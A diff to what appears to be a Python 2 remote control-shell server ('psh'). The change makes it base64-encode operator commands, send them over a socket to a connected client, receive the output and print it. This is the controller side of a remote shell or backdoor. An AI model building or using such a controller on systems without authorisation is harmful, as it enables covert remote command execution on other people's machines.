@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import re
+import base64
 import socket
 import argparse
 from datetime import datetime
@@ -30,33 +31,23 @@ def ctrl_shell_server(s, PORT):
                 print 'commands:\n  exec'
             elif inp.startswith('exec'):
                 if re.search('^exec (".+"\ )+$', inp + ' '):
-                    ctrl_shell_exec(inp)
+                    response = ctrl_shell_exec(conn, inp)
+                    print response
                 else:
                     print 'usage: exec "cmd1" ["cmd2" "cmd3" ...]'
             else:
-                print 'psh: command not found'
+                print 'psh: {}: command not found'.format(inp)
         except KeyboardInterrupt:
             break
+    conn.send(base64.b64encode('fin'))
     conn.close()
     print '[+] ({}) Exiting control shell.'.format(datetime.now())
 
 
-def ctrl_shell_exec(inp):
-    cmds = parse_inp_cmds(inp)
-
-
-def parse_inp_cmds(inp):
-    cmds = []
-    inp = inp[5:]
-    num_cmds = len(re.findall('"', inp)) / 2
-    for i in range(num_cmds):
-        first = inp.find('"')
-        second = inp.find('"', first+1)
-        cmd = inp[first+1:second]
-        cmds.append(cmd)
-        inp = inp[second+2:]
-    return cmds
-
+def ctrl_shell_exec(conn, inp):
+    conn.send(base64.b64encode(inp))
+    stdout = conn.recv(SIZE)
+    return base64.b64decode(stdout)
 
 
 def main():
